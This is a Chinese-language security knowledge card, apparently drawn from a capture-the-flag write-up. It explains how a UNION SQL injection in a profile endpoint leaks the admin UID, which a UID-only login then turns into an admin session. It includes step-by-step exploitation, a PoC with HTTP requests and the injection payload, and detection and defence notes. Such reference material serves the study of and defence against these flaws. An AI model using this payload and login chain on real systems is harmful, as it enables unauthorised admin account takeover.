---
id: web-generic-auth-sqli-admin-uid-uid-only-login
title: SQL 注入取管理员 UID 后利用“仅 UID 登录”直接接管管理员
type: scenario
domain: web
path: web/generic/auth
technique: sqli-admin-uid-uid-only-login
aliases:
- BrokenTrust
- 仅凭 UID 登录
- UID-only 登录
- SQLi 取管理员 UID
- 无密码登录
tags:
- web
- auth
- sqli
- uid
- account-takeover
- broken-authentication
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V124
  verified_at: '2026-11-06T04:17:17+08:00'
  notes: 已对照原文核对：/api/profile 的 uid 拼 SQL、UNION 列数 3、注入语句 ' union select uid,username,role from users where role='admin'--、返回管理员 UID b7467374f2fe42d3b1768a4e44329fc2、/login 仅凭 uid 建立会话均一致；原文后续备份接口 ....// 穿越读 /flag 属另一手法，已由既有卡覆盖，未在本卡展开。未验证点：无靶机，PoC 未复跑；原文未标注受影响版本；frontmatter 无 sources/source_url。
---

## 一句话结论

当登录接口只接收 `uid`、不校验密码，而另一个资料接口把 `uid` 拼进 SQL 时，攻击者先用 UNION 注入查出管理员 UID，再把该 UID 提交给登录接口，即可无密码接管管理员账号。

## 原理

- `/api/profile` 把用户提交的 `uid` 直接拼进 SQL；用 `' union select uid,username,role from users where role='admin'-- ` 可让查询返回管理员记录，响应字段（如 `uid`/`username`/`role`）直接回显。
- `/login` 的认证模型只校验 `uid` 是否存在，不要求密码、验证码或签名令牌；服务端把 `uid` 直接映射为会话身份。
- 两个缺陷串联：SQLi 提供“管理员 UID”这一秘密，UID-only 登录把该秘密直接兑换为管理员会话。
- 根因是“身份标识”与“认证凭据”混为一谈：UID 只是标识符，不应单独作为登录凭据；SQL 拼接则让标识符可被任意读取。

## 触发条件

- 登录接口只凭 UID（或用户名/邮箱等可枚举标识）即可建立会话，没有密码/二次校验。
- 另一个接口存在 SQL 注入，能读出 `users` 表中的管理员 UID。
- 注入查询的列数与回显字段匹配，或可通过报错/布尔盲注提取 UID。
- 管理员 UID 在系统中唯一且可直接用于登录。

## 利用步骤

1. 注册/登录普通用户，找到资料刷新接口（如 `POST /api/profile`）。
2. 用单引号/类型错误确认 SQL 注入，确定列数（如 3 列）。
3. UNION 查询管理员 UID：`' union select uid,username,role from users where role='admin'-- `。
4. 把返回的 `uid` 提交给 `/login`（仅 `uid` 参数），获得管理员会话。
5. 访问管理员接口，继续利用备份/文件读取等功能。

## PoC

```http
POST /api/profile HTTP/1.1
Content-Type: application/json

{"uid":"' union select uid,username,role from users where role='admin'-- "}
```

```json
{"role":"admin","uid":"b7467374f2fe42d3b1768a4e44329fc2","username":"admin"}
```

```http
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

uid=b7467374f2fe42d3b1768a4e44329fc2
```

## 变体与关联

- 登录标识可换成 username/email/手机号；只要服务端只查存在性而不校验密码，同样成立。
- SQLi 可换成 IDOR/用户列表泄露/日志泄露来获取管理员 UID。
- 关联：[[web-generic-sqli-login-username-comment-universal-password]]（登录处 SQLi 绕过）、[[web-generic-auth-uid-resetpwd-hardcoded-default-password]]（按 uid 重置密码接管）。

## 检测与防御

- 登录必须校验密码/多因素/签名令牌，不能只凭 UID；会话应与认证事件绑定。
- 所有 SQL 使用参数化查询，禁止字符串拼接；对 `uid` 做类型/格式校验。
- 检测：`/api/profile` 中出现 `union select`、`--`、引号闭合；同一 UID 在短时间内从不同来源登录。
